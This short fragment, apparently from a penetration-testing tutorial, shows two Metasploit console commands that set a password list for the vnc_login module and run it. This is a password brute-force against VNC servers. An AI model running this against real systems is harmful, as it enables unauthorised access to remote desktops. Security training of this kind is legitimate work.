-   `msf auxiliary(vnc_login) >set pass_file /root/Desktop/pass.txt`    
-   `msf auxiliary(vnc_login) > run`

